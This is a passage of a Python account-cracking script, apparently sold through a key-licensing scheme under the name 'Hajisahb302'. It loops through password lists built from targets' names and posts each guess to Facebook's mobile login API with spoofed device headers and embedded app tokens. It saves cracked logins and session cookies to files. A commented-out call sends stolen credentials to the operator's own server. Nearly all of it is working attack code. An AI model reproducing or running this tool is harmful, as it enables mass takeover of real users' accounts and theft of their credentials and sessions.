            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": code1,"client_country_code": loc1,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {"User-Agent": M1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000,40000)),"X-FB-SIM-HNI": str(random.randint(20000,40000)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Content-Length": "797"}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                print(f'\r\r{G} [Hajisahb302-OK] '+ids+' | '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                open('/sdcard/Hajisahb302/Hajisahb302-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                open('/sdcard/Hajisahb302/Hajisahb302-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                #free(ids,pas,cookies)
                break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r{R} [Hajisahb302-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                if 'n' in pcp:
                    open('/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:pass
#<<_________[ METHOD 3 ]_________>>#
def ffb3(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f'\r\r{W} [Hajisahb302-M3] %s|OK/CP %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code2,'client_country_code': loc2,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': M2(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                print(f'\r\r{G} [Hajisahb302-OK] '+ids+' | '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                open('/sdcard/Hajisahb302/Hajisahb302-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                open('/sdcard/Hajisahb302/Hajisahb302-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                #free(ids,pas,cookies)
                break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r{R} [Hajisahb302-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                if 'n' in pcp:
                    open('/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:pass
#<<_________[ KEY SETUP ]_________>>#
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "DJS-"+myid+xp
from datetime import datetime
from datetime import timedelta
date_today = datetime.now()
now = datetime.now()
day = now.day
month = now.month
year = now.year
datee = f"{year}-{month}-{day}"
trk=[]
def Activate():
    try:
        clear()
        if "Trail" in trk:
            print(" Put Your Trail Key Bellow! ")
            line()
            key = input(' Put Key: ')
        else:
            key = getKey()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        from platform import platform
        params={'key': key,'device':platform()}
        url = ("https://Hajisahb302.serv00.net/checkp.php")
        url_with_params = f"{url}?{'&'.join([f'{key}={value}' for key, value in params.items()])}"
        http_obj = httplib2.Http()
        header_obj = {}
        for key, value in headers.items():
            header_obj[key] = value
        response, content = http_obj.request(
        uri=url_with_params,
        method="GET",
        headers=header_obj
        )
        response = content.decode('utf-8')
        if "error" in response:
            if "Key has expired" in response:  
                subscription("Your Key Has Been Expired! ")
            else:
                subscription("You're Not Premium User ")
        elif "user" in response:
            result = json.loads(response)
            try:
                name = result['name']
            except:
                name = '-'
            user = result['user']
            exp = result['expired']
            join = result['joined']
            a = arrow.get(datee)
            b = arrow.get(exp)
            delta = (b-a)
            menu(name,join,user,exp,delta)
        else:
            Activate()
    except requests.exceptions.ConnectionError:
        print(" Internet Connection Error")
        time.sleep(1)
        exit()
def free(dayx,monthx,yearx):
    try:
        url = ("https://hajisahb302.serv00.net/upp.php")
        requests.post(url,data={'texts':str(dayx+'|'+monthx+'|'+yearx)})
    except requests.exceptions.ConnectionError:
        free(dayx,monthx,yearx)
    except Exception as e:pass
def subscription(message):
    clear()
    key = getKey()
    print(f'{G} [{W}+{G}]{W} MESSAGE: '+message)
    line()
    print(f'{G} [{W}+{G}]{R}           YOUR KEY IS NOT ACTIVE')
    line() 
    print(f'{G} [{W}+{G}]{W} Get Approval For Free Use ')
    print(f'{G} [{W}+{G}]{W} Send Your Key To Admin')
    print(f'{G} [{W}+{G}]{W} And Get Approval')
    line() 
    print(f"{G} [{W}+{G}]{W} YOUR KEY :\x1b[1;97m "+key)
    line()
    xh = input(f'{G} [{W}+{G}]{W} PRESS ENTER')
    if xh in ["Trail","trail"]:
        trk.append('Trail')
        Activate()
    line()
    uname = input(f'{G}  [{W}+{G}]{W} PUT YOUR NAME: ')
    tsk = "Hello Hajisahb Sir! I Need To Use Your Premium Tools So Please Approve My Token-:)\n\nName: "+uname+" \nToken: "+key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+923114132829&text="+ tsk]);time.sleep(2)
    Activate()
try:menu()
except Exception as e:exit(e)
